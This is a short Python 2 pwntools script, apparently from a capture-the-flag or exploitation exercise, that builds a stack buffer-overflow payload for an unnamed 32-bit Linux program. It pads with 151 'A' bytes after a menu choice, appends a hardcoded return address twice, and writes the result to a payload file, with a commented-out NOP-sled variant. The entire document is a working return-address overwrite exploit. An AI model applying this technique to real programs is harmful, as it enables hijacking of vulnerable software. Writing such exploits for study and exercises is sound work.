#!/usr/bin/env python2

from pwn import *

context.arch = 'i386'
context.os = 'linux'

ret_addr = 0x565562ad
addr = p32(ret_addr, endian='little')

nop = asm('nop', arch = "i386")

#inf = open("input_pattern","r")
#pattern = inf.read()

#pattern = "2\n"+ nop*1022 + nop*151 + addr
pattern = "2\n"+ "A"*151 + addr
payload = pattern + addr

shellcode_file = "m_payload"

with open(shellcode_file, "wb") as f:
        f.write(payload)

log.info("Payload saved into %s" % shellcode_file)

